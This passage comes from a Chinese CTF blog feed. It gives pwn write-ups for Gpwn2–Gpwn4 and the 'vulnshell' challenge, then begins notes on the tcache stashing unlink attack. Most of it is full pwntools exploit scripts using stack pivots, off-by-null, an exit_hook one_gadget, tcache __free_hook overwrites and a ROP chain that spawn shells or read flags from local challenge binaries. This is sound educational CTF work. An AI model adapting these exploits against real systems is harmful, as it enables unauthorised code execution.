src="/2021/10/18/%E8%A5%BF%E9%82%AE%E7%AC%AC%E4%BA%8C%E5%B1%8A%E6%A0%A1%E8%B5%9B/image-20211018192016073.png" class="lazyload placeholder" data-srcset="/2021/10/18/%E8%A5%BF%E9%82%AE%E7%AC%AC%E4%BA%8C%E5%B1%8A%E6%A0%A1%E8%B5%9B/image-20211018192016073.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211018192016073"></p><p>然后输入账号密码发现报错，我们使用gdb调试看一下为什么会报错，发现其实是我们输入密码的时候，有一条代码<code>s[v4]=0</code>,它将存储在s1中的密码的MD5值的第一字节置0，使其比对错误。</p><p><img src="/2021/10/18/%E8%A5%BF%E9%82%AE%E7%AC%AC%E4%BA%8C%E5%B1%8A%E6%A0%A1%E8%B5%9B/image-20211018192300031.png" class="lazyload placeholder" data-srcset="/2021/10/18/%E8%A5%BF%E9%82%AE%E7%AC%AC%E4%BA%8C%E5%B1%8A%E6%A0%A1%E8%B5%9B/image-20211018192300031.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211018192300031"></p><p>因此我们容易想到strcmp可以通过\x00截断绕过，就是说如果我们输入的密码的MD5后的第一个字节也是\x00，我们就能绕过strcmp函数进入到漏洞函数中了。因此需要我们爆破MD5，又因为密码的长度被限制到了0x20大小，所以我们从0x10000000000000000000000000000000开始爆破。</p><p>爆破代码如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">def md5encry(data):</span><br><span class="line">    md5 = hashlib.md5()  # 应用MD5算法</span><br><span class="line">    md5.update(data.encode(&#x27;utf-8&#x27;))</span><br><span class="line">    md = int(md5.hexdigest(), 16)</span><br><span class="line">    return md</span><br><span class="line"></span><br><span class="line">for i in range(0x10000000000000000000000000000000,0x20000000000000000000000000000000):</span><br><span class="line">    h1 = hex(md5encry(hex(i)[2:]))[2:]</span><br><span class="line">    if len(h1) != 0x20:</span><br><span class="line">        h1 = h1.rjust(0x20,&#x27;0&#x27;)</span><br><span class="line">        #print((h1))</span><br><span class="line">    if h1[0]==&#x27;0&#x27; and h1[1]==&#x27;0&#x27;:</span><br><span class="line">        print(h1)</span><br><span class="line">        print(hex(i))</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><p>之后就是一个简单的栈迁移，将栈迁到一个可读的段上就OK了。栈迁移那部分构造比较精妙需要认真调试！</p><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&#x27;./Gpwn2&#x27;)</span><br><span class="line">elf = ELF(&#x27;./Gpwn2&#x27;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">system = elf.plt[&#x27;system&#x27;]</span><br><span class="line">leave_ret = 0x80495B1</span><br><span class="line">io.recvuntil(&#x27;Checkname:\n&#x27;)</span><br><span class="line">payload = &#x27;admin\x0a&#x27;</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(&#x27;Pass:\n&#x27;)</span><br><span class="line">payload = &#x27;10000000000000000000000000000266&#x27;</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(&#x27;Success\n&#x27;)</span><br><span class="line"></span><br><span class="line">payload = &#x27;a&#x27;*0x18+p32(0x804b500+0x18)+p32(0x804959B)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.send(payload)</span><br><span class="line">raw_input()</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">payload = p32(system)+p32(0)+p32(0x804b50c)+&#x27;/bin/sh\x00&#x27;</span><br><span class="line">payload = payload.ljust(0x18,&#x27;\x00&#x27;)</span><br><span class="line">payload += p32(0x804b500-4)+p32(leave_ret)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="3-Gpwn3"><a href="#3-Gpwn3" class="headerlink" title="3.Gpwn3"></a>3.Gpwn3</h3><p>这个题利用的是strcpy、strcat等一些对字符串操作的函数的漏洞，当他们复制字符串的时候会把字符串的最后一个字节\x00给带上，极容易造成off-by-null漏洞。而这个题的漏洞点正在于此，\x00正好将存放长度的地址覆盖置0，就可以将长度的值改写为一个很大的值，打败boss进入到奖励函数中。</p><p><img src="/2021/10/18/%E8%A5%BF%E9%82%AE%E7%AC%AC%E4%BA%8C%E5%B1%8A%E6%A0%A1%E8%B5%9B/image-20211018200812142.png" class="lazyload placeholder" data-srcset="/2021/10/18/%E8%A5%BF%E9%82%AE%E7%AC%AC%E4%BA%8C%E5%B1%8A%E6%A0%A1%E8%B5%9B/image-20211018200812142.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211018200812142"></p><p>在这里我将所有函数返回都改写成了exit()函数，目的就是想让你们利用exit_hook。[exit_hook的知识点]( <a href="https://blackbird-bb.github.io/2021/05/20/PWN%E5%AD%A6%E4%B9%A0%E2%80%94exit-hook-%E5%81%B7%E5%AE%B6/">PWN学习—exit_hook-偷家 - BlackBird’s Blog (blackbird-bb.github.io)</a> ) 参考这位西电大佬写的博客，然后直接打onegadget就ok了。在打one_gadget的时候正常出来的四个gadget不能打通，这时候在one_gadget后加上-l2可以找到更多的gadget。</p><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io=process(&#x27;./Gpwn3&#x27;)</span><br><span class="line">io=remote(&#x27;127.0.0.1&#x27;,10001)</span><br><span class="line">elf=ELF(&#x27;./Gpwn3&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc-2.23.so&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def create(description):</span><br><span class="line">io.sendlineafter(&#x27;choice:&#x27;,&#x27;1&#x27;)</span><br><span class="line">io.sendafter(&#x27; level :\n&#x27;,description)</span><br><span class="line"></span><br><span class="line">def power(description):</span><br><span class="line">io.sendlineafter(&#x27;choice:&#x27;,&#x27;2&#x27;)</span><br><span class="line">io.sendafter(&#x27;another level :&#x27;,description)</span><br><span class="line"></span><br><span class="line">def beat():</span><br><span class="line">io.sendlineafter(&#x27;choice:&#x27;,&#x27;3&#x27;)</span><br><span class="line"></span><br><span class="line">def give_up():</span><br><span class="line">io.sendlineafter(&#x27;choice:&#x27;,&#x27;4&#x27;)</span><br><span class="line"> </span><br><span class="line">def exp():</span><br><span class="line">create(&#x27;a&#x27;*19+&#x27;\n&#x27;)</span><br><span class="line">power(&#x27;a&#x27;)</span><br><span class="line">power(&#x27;\xff\xff\xff&#x27;)</span><br><span class="line">beat()</span><br><span class="line"></span><br><span class="line">io.recvuntil(&#x27;reward: &#x27;)</span><br><span class="line">puts=int(io.recv(14),16)</span><br><span class="line">libc_base=puts-libc.symbols[&#x27;puts&#x27;]</span><br><span class="line">print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">dl_rtld_unlock_recursive = libc_base+0x5f0040+3856</span><br><span class="line">gadget=[0x45226,0x4527a,0xf03a4,0xf1247,0xcd173,0xcd248,0xf03b0,0xf67f0]</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">io.sendafter(&#x27;your name:&#x27;,p64(dl_rtld_unlock_recursive))</span><br><span class="line">io.sendafter(&#x27;for you!&#x27;,p64(gadget[7]+libc_base))</span><br><span class="line">io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h3 id="4-Gpwn4"><a href="#4-Gpwn4" class="headerlink" title="4.Gpwn4"></a>4.Gpwn4</h3><p>一个简单的菜单堆题，用的是libc-2.27，直接打tcache泄露libc_base然后打__free_hook函数就ok了。这里就不过多解释了。</p><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=process(&#x27;./Gpwn4&#x27;)</span><br><span class="line">elf=ELF(&#x27;./Gpwn4&#x27;)</span><br><span class="line">libc=elf.libc</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">io.sendlineafter(&#x27;Choice: &#x27;,&#x27;1&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;size: &#x27;,str(size))</span><br><span class="line">io.sendafter(&#x27;content: &#x27;,content)</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">io.sendlineafter(&#x27;Choice: &#x27;,&#x27;2&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;idx: &#x27;,str(index))</span><br><span class="line">io.sendlineafter(&#x27;content: &#x27;,content)</span><br><span class="line"></span><br><span class="line">def dele(index):</span><br><span class="line">io.sendlineafter(&#x27;Choice: &#x27;,&#x27;3&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;idx: &#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">io.sendlineafter(&#x27;Choice: &#x27;,&#x27;4&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;idx: &#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">add(0x410,&#x27;a&#x27;)#0</span><br><span class="line">add(0x68,&#x27;a&#x27;)#1</span><br><span class="line">dele(0)</span><br><span class="line">show(0)</span><br><span class="line">malloc_hook=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))-96-16</span><br><span class="line">libc_base=malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">free_hook=libc_base+libc.symbols[&#x27;__free_hook&#x27;]</span><br><span class="line">system=libc_base+libc.symbols[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">edit(1,p64(free_hook-8))</span><br><span class="line">add(0x68,&#x27;a&#x27;)#2</span><br><span class="line">add(0x68,&#x27;/bin/sh\x00&#x27;+p64(system))#3</span><br><span class="line">dele(3)</span><br><span class="line">io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>长城杯final</title>
      <link href="/2021/10/14/%E9%95%BF%E5%9F%8E%E6%9D%AFfinal/"/>
      <url>/2021/10/14/%E9%95%BF%E5%9F%8E%E6%9D%AFfinal/</url>
      
        <content type="html"><![CDATA[<h3 id="长城杯final"><a href="#长城杯final" class="headerlink" title="长城杯final"></a>长城杯final</h3><span id="more"></span><h3 id="vulnshell"><a href="#vulnshell" class="headerlink" title="vulnshell"></a>vulnshell</h3><p>一道正常的堆题，当时决赛没有做出来，赛后多亏darry👴的提醒，让我茅塞顿开。</p><p>其实对于有tcache存在的libc版本，将堆申请到栈上都是挺容易的，因为不需要对chunk的头做检查（libc-2.23只需要在栈上提前布置好chunk头就行）。因此，除了打free_hook和malloc_hook，我们也可以将堆申请到栈上来构造我们的rop然后执行。只不过我们需要先得到栈的地址，environ在其中起到很关键的作用。</p><p>这个题漏洞点就在于cp操作中，复制了原来的chunk造成了两个指针指向同一个chunk，造成uaf漏洞。</p><p><img src="/2021/10/14/%E9%95%BF%E5%9F%8E%E6%9D%AFfinal/ABf1ag-blog\source_posts\长城杯final\image-20211014170510192.png" class="lazyload placeholder" data-srcset="/2021/10/14/%E9%95%BF%E5%9F%8E%E6%9D%AFfinal/ABf1ag-blog\source_posts\长城杯final\image-20211014170510192.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211014170510192"></p><p>exp如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=process(&#x27;./vuln&#x27;)</span><br><span class="line">elf=ELF(&#x27;./vuln&#x27;)</span><br><span class="line">libc=elf.libc</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">context.arch=&#x27;amd64&#x27;</span><br><span class="line"></span><br><span class="line">def cmd(cmd):</span><br><span class="line">io.sendlineafter(&#x27;root@Vshell# &#x27;,cmd)</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">cmd(&#x27;touch 0&#x27;)</span><br><span class="line">cmd(&#x27;touch a&#x27;)</span><br><span class="line">cmd(&#x27;vi 0&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;Data: &#x27;,&#x27;a&#x27;*0xf7)</span><br><span class="line">cmd(&#x27;vi a&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;Data: &#x27;,&#x27;a&#x27;*0xf7)</span><br><span class="line">cmd(&#x27;cp a b&#x27;)</span><br><span class="line">cmd(&#x27;rm 0&#x27;)</span><br><span class="line">cmd(&#x27;rm a&#x27;)</span><br><span class="line">cmd(&#x27;cat b&#x27;)</span><br><span class="line">heap_base=u64(io.recv(6).ljust(8,&#x27;\x00&#x27;))-0x310</span><br><span class="line">print(&#x27;heap_base&#x27;,hex(heap_base))</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">cmd(&#x27;vi b&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;Data: &#x27;,p64(heap_base))</span><br><span class="line">cmd(&#x27;touch c&#x27;)</span><br><span class="line">cmd(&#x27;vi c&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;Data: &#x27;,&#x27;a&#x27;*0xf7)</span><br><span class="line">cmd(&#x27;touch d&#x27;)</span><br><span class="line">cmd(&#x27;vi d&#x27;)</span><br><span class="line">payload=&#x27;\x00&#x27;*2*9+&#x27;\x00\x00&#x27;</span><br><span class="line">payload=payload.ljust(0xf0,&#x27;\x00&#x27;)</span><br><span class="line">io.sendafter(&#x27;Data: &#x27;,payload)#tcache</span><br><span class="line">cmd(&#x27;touch e&#x27;)</span><br><span class="line">cmd(&#x27;touch g&#x27;)</span><br><span class="line">cmd(&#x27;vi e&#x27;)</span><br><span class="line">io.sendafter(&#x27;Data: &#x27;,&#x27;\x00&#x27;*0xa0)</span><br><span class="line">cmd(&#x27;vi g&#x27;)</span><br><span class="line">io.sendafter(&#x27;Data: &#x27;,&#x27;\x00&#x27;*0xa0)</span><br><span class="line">cmd(&#x27;cp e f&#x27;)</span><br><span class="line">cmd(&#x27;vi d&#x27;)</span><br><span class="line">payload=&#x27;\x00&#x27;*2*11+&#x27;\x07\x00&#x27;</span><br><span class="line">#payload=payload.ljust(0xf0,&#x27;\x00&#x27;)</span><br><span class="line">io.sendafter(&#x27;Data: &#x27;,payload)#tcache</span><br><span class="line">cmd(&#x27;rm f&#x27;)</span><br><span class="line">cmd(&#x27;cat e&#x27;)</span><br><span class="line">malloc_hook=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))-96-16</span><br><span class="line">libc_base=malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">system=libc_base+libc.symbols[&#x27;system&#x27;]</span><br><span class="line">free_hook=libc_base+libc.symbols[&#x27;__free_hook&#x27;]</span><br><span class="line">environ=libc_base+libc.symbols[&#x27;_environ&#x27;]</span><br><span class="line"></span><br><span class="line">cmd(&#x27;vi d&#x27;)</span><br><span class="line">payload=&#x27;\x00&#x27;*2*11+&#x27;\x00\x00&#x27;</span><br><span class="line">#payload=payload.ljust(0xf0,&#x27;\x00&#x27;)</span><br><span class="line">io.sendafter(&#x27;Data: &#x27;,payload)#tcache</span><br><span class="line">cmd(&#x27;cp g z&#x27;)</span><br><span class="line">cmd(&#x27;rm g&#x27;)</span><br><span class="line">cmd(&#x27;vi d&#x27;)</span><br><span class="line">payload=&#x27;\x00&#x27;*2*11+&#x27;\x02\x00&#x27;</span><br><span class="line">io.sendafter(&#x27;Data: &#x27;,payload)#tcache</span><br><span class="line">cmd(&#x27;vi z&#x27;)</span><br><span class="line">io.sendafter(&#x27;Data: &#x27;,p64(environ-0xa0)+&#x27;\x00&#x27;*0x98)</span><br><span class="line">cmd(&#x27;touch g&#x27;)</span><br><span class="line">cmd(&#x27;vi g&#x27;)</span><br><span class="line">io.sendafter(&#x27;Data: &#x27;,&#x27;\x00&#x27;*0xa0)</span><br><span class="line">cmd(&#x27;rm b&#x27;)</span><br><span class="line">cmd(&#x27;touch 1&#x27;)</span><br><span class="line">cmd(&#x27;vi 1&#x27;)</span><br><span class="line">io.sendafter(&#x27;Data: &#x27;,&#x27;a&#x27;*0xa0)</span><br><span class="line">cmd(&#x27;cat 1&#x27;)</span><br><span class="line">stack=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">stack=stack-0x100</span><br><span class="line">print(&#x27;stack&#x27;,hex(stack))</span><br><span class="line">cmd(&#x27;rm g&#x27;)</span><br><span class="line">cmd(&#x27;vi d&#x27;)</span><br><span class="line">payload=&#x27;\x00&#x27;*2*11+&#x27;\x02\x00&#x27;</span><br><span class="line">#payload=payload.ljust(0xf0,&#x27;\x00&#x27;)</span><br><span class="line">io.sendafter(&#x27;Data: &#x27;,payload)#tcache</span><br><span class="line">cmd(&#x27;vi z&#x27;)</span><br><span class="line">io.sendafter(&#x27;Data: &#x27;,p64(stack)+&#x27;\x00&#x27;*0x98)</span><br><span class="line">cmd(&#x27;touch g&#x27;)</span><br><span class="line">cmd(&#x27;vi g&#x27;)</span><br><span class="line">io.sendafter(&#x27;Data: &#x27;,&#x27;a&#x27;*0xa0)</span><br><span class="line">cmd(&#x27;rm d&#x27;)</span><br><span class="line">cmd(&#x27;touch 2&#x27;)</span><br><span class="line">cmd(&#x27;vi 2&#x27;)</span><br><span class="line">payload=[libc.search(asm(&#x27;pop rdi\nret&#x27;)).next()+libc_base,</span><br><span class="line">stack+0x80,</span><br><span class="line">libc.search(asm(&#x27;pop rsi\nret&#x27;)).next()+libc_base,</span><br><span class="line">0,</span><br><span class="line">libc.symbols[&#x27;open&#x27;]+libc_base,</span><br><span class="line">libc.search(asm(&#x27;pop rdi\nret&#x27;)).next()+libc_base,</span><br><span class="line">3,</span><br><span class="line">libc.search(asm(&#x27;pop rsi\nret&#x27;)).next()+libc_base,</span><br><span class="line">stack+0x80,</span><br><span class="line">0x000000000011c371+libc_base,</span><br><span class="line">0x30,</span><br><span class="line">0,</span><br><span class="line">libc.symbols[&#x27;read&#x27;]+libc_base,</span><br><span class="line">libc.search(asm(&#x27;pop rdi\nret&#x27;)).next()+libc_base,</span><br><span class="line">1,</span><br><span class="line">libc.symbols[&#x27;write&#x27;]+libc_base,</span><br><span class="line">&#x27;./flag\x00\x00&#x27;,</span><br><span class="line">0,</span><br><span class="line">0,</span><br><span class="line">0]</span><br><span class="line"></span><br><span class="line">io.sendafter(&#x27;Data: &#x27;,flat(payload))</span><br><span class="line">cmd(&#x27;exit&#x27;)</span><br><span class="line">io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>tcache_stashing_unlink_attack学习笔记</title>
      <link href="/2021/10/01/tcache-stashing-unlink-attack%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2021/10/01/tcache-stashing-unlink-attack%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="tcache-stashing-unlink-attack学习笔记"><a href="#tcache-stashing-unlink-attack学习笔记" class="headerlink" title="tcache_stashing_unlink_attack学习笔记"></a>tcache_stashing_unlink_attack学习笔记</h3><span id="more"></span><p>原理：当使用calloc函数分配堆时，libc-2.29以上版本中calloc函数都不会从tcache中申请chunk。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">  if (in_smallbin_range (nb))  </span><br><span class="line">    &#123;  </span><br><span class="line">      idx = smallbin_index (nb);  </span><br><span class="line">      bin = bin_at (av, idx);  </span><br><span class="line">  </span><br><span class="line">      if ((victim = last (bin)) != bin) //取该索引对应的small bin中最后一个chunk  </span><br><span class="line">        &#123;  </span><br><span class="line">          bck = victim-&gt;bk;  //获取倒数第二个chunk  </span><br><span class="line">      if (__glibc_unlikely (bck-&gt;fd != victim)) //检查双向链表完整性  </span><br><span class="line">        malloc_printerr (&quot;malloc(): smallbin double linked list corrupted&quot;);  </span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);  </span><br><span class="line">          bin-&gt;bk = bck; //将victim从small bin的链表中卸下  </span><br><span class="line">          bck-&gt;fd = bin;  </span><br><span class="line">  </span><br><span class="line">          if (av != &amp;main_arena)  </span><br><span class="line">        set_non_main_arena (victim);  </span><br><span class="line">          check_malloced_chunk (av, victim, nb);  </span><br><span class="line">#if USE_TCACHE  </span><br><span class="line">      /* While we&#x27;re here, if we see other chunks of the same size, </span><br><span class="line">         stash them in the tcache.  */  </span><br><span class="line">      size_t tc_idx = csize2tidx (nb); //获取对应size的tcache索引  </span><br><span class="line">      if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) //如果该索引在tcache bin范围  </span><br><span class="line">        &#123;  </span><br><span class="line">          mchunkptr tc_victim;  </span><br><span class="line">  </span><br><span class="line">          /* While bin not empty and tcache not full, copy chunks over.  */  </span><br><span class="line">          while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count  //当tcache bin不为空并且没满，并且small bin不为空，则依次取最后一个chunk插入到tcache bin里  </span><br><span class="line">             &amp;&amp; (tc_victim = last (bin)) != bin)  </span><br><span class="line">        &#123;  </span><br><span class="line">          if (tc_victim != 0)  </span><br><span class="line">            &#123;  </span><br><span class="line">              bck = tc_victim-&gt;bk;  //漏洞产生点，修改bk指针即可伪造bck</span><br><span class="line">              set_inuse_bit_at_offset (tc_victim, nb);  </span><br><span class="line">              if (av != &amp;main_arena)  </span><br><span class="line">            set_non_main_arena (tc_victim);  </span><br><span class="line">              bin-&gt;bk = bck; //将当前chunk从small bin里卸下  </span><br><span class="line">              bck-&gt;fd = bin; //将arena的值写入</span><br><span class="line">                      //放入tcache bin里  </span><br><span class="line">              tcache_put (tc_victim, tc_idx);  </span><br><span class="line">                &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        &#125;    </span><br><span class="line">          void *p = chunk2mem (victim);  </span><br><span class="line">          alloc_perturb (p, bytes);  </span><br><span class="line">          return p;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">-----------------------------------</span><br><span class="line">原文链接：https://blog.csdn.net/seaaseesa/article/details/105870247</span><br></pre></td></tr></table></figure><p>由以上代码可知，当我们从smallbin中取出最后一个chunk，将会对双向链表做了一个完整性的检查，但是将smallbin中的chunk放入tcache时的这个过程却没有检查。</p><p>利用手法1：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 